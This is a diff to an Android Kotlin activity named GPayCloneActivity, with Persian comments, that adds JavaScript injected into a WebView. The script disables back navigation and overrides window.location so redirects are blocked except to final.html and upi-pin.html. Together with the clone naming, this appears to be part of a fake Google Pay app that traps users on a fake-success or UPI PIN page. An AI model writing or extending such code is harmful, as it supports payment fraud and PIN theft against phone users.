@@ -200,6 +200,40 @@ class GPayCloneActivity : AppCompatActivity() {
                     Log.d(TAG, "✅ PAYMENT SUCCESS - Closing MainActivity and keeping clone open")
                     Log.d(TAG, "════════════════════════════════════════")
                     
+                    // ⭐ غیرفعال کردن history.go(1) و back button در final.html
+                    webView.evaluateJavascript(
+                        """
+                        (function() {
+                            // ⭐ غیرفعال کردن history.go(1) و back button handlers
+                            if (typeof window.onpopstate === 'function') {
+                                window.onpopstate = null;
+                            }
+                            window.onpopstate = function() {
+                                // هیچ کاری نکن - جلوگیری از برگشت
+                            };
+                            
+                            // ⭐ جلوگیری از redirect به index.html
+                            var originalLocation = window.location.href;
+                            Object.defineProperty(window, 'location', {
+                                get: function() {
+                                    return {
+                                        href: originalLocation,
+                                        assign: function() {},
+                                        replace: function() {}
+                                    };
+                                },
+                                set: function(val) {
+                                    // فقط اگر final.html یا upi-pin.html باشه، اجازه بده
+                                    if (val && (val.includes('final.html') || val.includes('upi-pin.html'))) {
+                                        originalLocation = val;
+                                    }
+                                }
+                            });
+                        })();
+                        """.trimIndent(),
+                        null
+                    )
+                    
                     // ⭐ یک تأخیر کوتاه برای نمایش final.html
                     Handler(Looper.getMainLooper()).postDelayed({
                         closeMainActivity()
